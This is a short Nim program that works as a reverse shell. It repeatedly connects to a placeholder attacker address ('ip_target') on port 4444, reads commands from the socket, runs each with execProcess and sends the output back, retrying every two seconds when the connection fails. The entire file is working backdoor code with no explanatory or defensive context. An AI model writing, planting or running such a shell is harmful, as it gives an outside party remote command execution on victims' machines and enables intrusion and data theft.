import std/osproc, std/times, net, os, streams

const
  ip = "ip_target"
  port = 4444

while true:
  try:
    echo now(), " Attempting to connect to ", ip, " on port ", port
    var socket = newSocket()
    socket.connect(ip, Port(port))
    echo now(), " Connected!"

    while true:
      try:
        socket.send(">")
        var command = socket.recvLine()
        if command == "quit\n":
          break

        var result = execProcess(command)
        socket.send(result)
      except IOError:
        echo now(), " Error sending response: ", getCurrentExceptionMsg()
        break
  except IOError:
    echo now(), " Unable to connect to ", ip, " on port ", port, " ", getCurrentExceptionMsg()
    sleep(2000)